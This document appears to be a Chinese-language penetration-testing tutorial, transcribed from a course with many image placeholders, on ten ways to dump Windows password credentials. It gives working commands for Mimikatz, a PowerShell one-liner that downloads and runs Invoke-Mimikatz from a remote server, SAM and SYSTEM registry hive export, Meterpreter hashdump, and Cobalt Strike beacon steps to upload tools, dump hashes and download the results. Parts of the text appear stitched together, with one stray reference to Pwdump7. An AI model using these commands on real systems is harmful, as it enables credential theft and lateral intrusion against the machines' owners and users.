## 第一部分：工具概述

![](img/02257b2088cbc1118f9758c1a8a27879_25.png)

以下是获取系统用户密码凭证的十种主要方法，我们将逐一进行介绍。

![](img/02257b2088cbc1118f9758c1a8a27879_33.png)

![](img/02257b2088cbc1118f9758c1a8a27879_34.png)

![](img/02257b2088cbc1118f9758c1a8a27879_36.png)

![](img/02257b2088cbc1118f9758c1a8a27879_38.png)

![](img/02257b2088cbc1118f9758c1a8a27879_40.png)

1.  **Mimikatz**：一款功能强大的知名工具，能够读取系统密码并解密特定加密的密码。
2.  **PowerShell脚本**：通过PowerShell方式加载获取哈希的脚本。
3.  **WCE (Windows Credentials Editor)**：与Mimikatz齐名的哈希管理工具。
4.  **Pwdump7**：可以读取当前系统各用户密码哈希的工具。
5.  **Ophcrack**：配合彩虹表进行哈希破解的工具。
6.  **Procdump + Mimikatz**：使用微软官方工具Procdump导出进程内存，再用Mimikatz还原密码。
7.  **注册表导出哈希**：从Windows注册表中导出存储的哈希值。
8.  **LaZagne**：一款功能强大的凭证提取工具，可获取浏览器、数据库、Wi-Fi等多种密码。
9.  **Metasploit (MSF)**：利用MSF框架中的模块（如`hashdump`）获取哈希。
10. **Cobalt Strike (CS)**：在CS信标会话中直接执行命令获取哈希或明文密码。

### 1. 使用Mimikatz

![](img/02257b2088cbc1118f9758c1a8a27879_51.png)

Mimikatz是最常用的凭证提取工具。你可以从其GitHub仓库下载。新版本（如2.x）集成了更多功能，命令与老版本（1.x）有所不同。

![](img/02257b2088cbc1118f9758c1a8a27879_53.png)

![](img/02257b2088cbc1118f9758c1a8a27879_54.png)

**本地非交互式凭证获取**是常用方式，通过单条命令执行，适用于远程执行场景。

![](img/02257b2088cbc1118f9758c1a8a27879_56.png)

![](img/02257b2088cbc1118f9758c1a8a27879_58.png)

以下是两个常用命令示例：

![](img/02257b2088cbc1118f9758c1a8a27879_60.png)

![](img/02257b2088cbc1118f9758c1a8a27879_62.png)

![](img/02257b2088cbc1118f9758c1a8a27879_64.png)

![](img/02257b2088cbc1118f9758c1a8a27879_66.png)

![](img/02257b2088cbc1118f9758c1a8a27879_67.png)

![](img/02257b2088cbc1118f9758c1a8a27879_69.png)

![](img/02257b2088cbc1118f9758c1a8a27879_71.png)

```
mimikatz "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```
此命令首先提权至`debug`模式，然后模拟系统令牌提升权限，最后导出`SAM`数据库中的哈希值。

![](img/02257b2088cbc1118f9758c1a8a27879_73.png)

![](img/02257b2088cbc1118f9758c1a8a27879_75.png)

```
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
此命令用于获取系统内存中存储的明文密码和哈希值。

![](img/02257b2088cbc1118f9758c1a8a27879_77.png)

![](img/02257b2088cbc1118f9758c1a8a27879_79.png)

![](img/02257b2088cbc1118f9758c1a8a27879_81.png)

执行后，会列出类似以下格式的结果，包含用户名、域名、NT哈希（NTLM hash）和可能的明文密码（`Password`）：
```
User Name : Administrator
Domain    : WIN-XXXX
NTLM      : 570a9a65db8fba761c1008a51d4c95ab
Password  : Passw0rd!
```

### 2. 使用PowerShell脚本加载

通过PowerShell可以远程加载并执行Mimikatz的功能脚本。

![](img/02257b2088cbc1118f9758c1a8a27879_83.png)

![](img/02257b2088cbc1118f9758c1a8a27879_85.png)

![](img/02257b2088cbc1118f9758c1a8a27879_87.png)

![](img/02257b2088cbc1118f9758c1a8a27879_89.png)

![](img/02257b2088cbc1118f9758c1a8a27879_91.png)

以下是加载远程脚本并执行获取明文密码的命令：
```powershell
IEX (New-Object Net.WebClient).DownloadString(‘http://your-server/Invoke-Mimikatz.ps1‘); Invoke-Mimikatz -DumpCreds
```
*   `IEX (Invoke-Expression)`：执行字符串中的命令。
*   `(New-Object Net.WebClient).DownloadString()`：从指定URL下载脚本内容。
*   `Invoke-Mimikatz -DumpCreds`：调用脚本中的函数执行Mimikatz的`sekurlsa::logonpasswords`命令。

![](img/02257b2088cbc1118f9758c1a8a27879_93.png)

![](img/02257b2088cbc1118f9758c1a8a27879_95.png)

![](img/02257b2088cbc1118f9758c1a8a27879_97.png)

同样，可以加载专门的哈希获取脚本：
```powershell
IEX (New-Object Net.WebClient).DownloadString(‘http://your-server/Get-PassHashes.ps1‘)
```

执行`Pwdump7.exe`，它会自动关闭窗口，因此需要将输出重定向到文件查看：

**从注册表导出**：
使用`reg`命令导出包含哈希的注册表项，然后用Mimikatz解析：
```
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```
之后在拥有这些文件的机器上使用Mimikatz的`lsadump::sam`功能进行解析。

**在Metasploit (MSF)中**：
获得一个Meterpreter会话后，在拥有管理员权限的前提下：
```
meterpreter > getsystem          # 提权至SYSTEM
meterpreter > hashdump           # 导出哈希
meterpreter > load mimikatz      # 加载Mimikatz扩展
meterpreter > msv                # 获取MSV凭证（哈希）
meterpreter > kerberos           # 获取Kerberos凭证
meterpreter > mimikatz_command -f sekurlsa::logonpasswords # 执行Mimikatz命令
```

当通过CS或MSF等框架获得shell后，如需使用独立的`.exe`工具（如`wce.exe`, `Pwdump7.exe`），需要以下步骤：

![](img/02257b2088cbc1118f9758c1a8a27879_204.png)

![](img/02257b2088cbc1118f9758c1a8a27879_206.png)

![](img/02257b2088cbc1118f9758c1a8a27879_208.png)

![](img/02257b2088cbc1118f9758c1a8a27879_210.png)

![](img/02257b2088cbc1118f9758c1a8a27879_212.png)

![](img/02257b2088cbc1118f9758c1a8a27879_214.png)

1.  **上传工具**：
    *   **CS**：使用`upload`命令或通过图形化文件管理器上传。
    *   **MSF**：在Meterpreter中使用`upload`命令。
2.  **执行工具**：
    *   在信标或Meterpreter会话中，使用`shell`命令进入命令行，或直接使用`execute`等命令运行程序。
    *   例如，在CS信标中：`beacon> shell C:\path\to\wce.exe`。
    *   对于输出不直接回显的工具（如Pwdump7），需重定向到文件再读取：
        ```
        beacon> shell C:\path\to\Pwdump7.exe > C:\hashes.txt
        beacon> shell type C:\hashes.txt
        ```
3.  **下载结果**：使用框架的`download`命令将结果文件下载到本地分析。
